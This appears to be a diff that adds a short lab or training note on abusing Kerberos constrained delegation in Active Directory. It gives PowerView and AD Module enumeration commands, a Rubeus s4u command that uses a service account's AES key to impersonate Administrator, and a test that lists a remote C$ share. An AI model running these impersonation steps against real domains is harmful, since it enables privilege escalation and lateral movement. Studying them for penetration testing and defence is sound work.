@@ -1,0 +1,23 @@
+To abuse constrained delegation in above scenario, we need to have access to the websvc account. If we have access to that account, it is possible to access the services listed in `msDS-AllowedToDelegateTo` of the `websvc` (web service on web server) account as **ANY user**
+
+Find users and computers with constrained delegation enabled (PowerView + AD Module)
+```powershell
+Get-DomainUser -TrustedToAuth
+Get-DomainComputer -TrustedToAuth
+
+Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne
+"$null"} -Properties msDS-AllowedToDelegateTo
+```
+
+**COMPROMISE THE WEB SERVICE ACCOUNT AND RUN THE FOLLOWING AS IT**
+
+Request a `TGT` and `TGS` and impersonate any user
+```powershell
+Rubeus.exe s4u /user:websvc /aes256:2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e87
+9470ade07e5412d7 /impersonateuser:Administrator /msdsspn:CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL /ptt
+```
+
+Test
+```powershell
+ls \\dcorp-mssql.dollarcorp.moneycorp.local\c$
+```
